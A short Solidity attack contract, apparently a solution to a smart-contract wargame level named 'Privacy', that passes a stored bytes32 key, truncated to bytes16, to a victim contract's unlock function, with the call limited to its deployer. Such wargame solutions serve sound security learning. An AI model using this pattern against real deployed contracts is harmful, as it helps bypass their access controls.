// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPrivacy {
    function unlock(bytes16) external;
}

contract PrivacyAttack {

    address public attacker;

    modifier onlyAttacker {
        require(msg.sender == attacker, "PrivacyAttack: NOT_OWNER");
        _;
    }

    constructor() {
        attacker = msg.sender;
    }
  
    function attack (address _victim, bytes32 _key) external onlyAttacker {
        IPrivacy privacy = IPrivacy(_victim);
        privacy.unlock(bytes16(_key));
    }
}
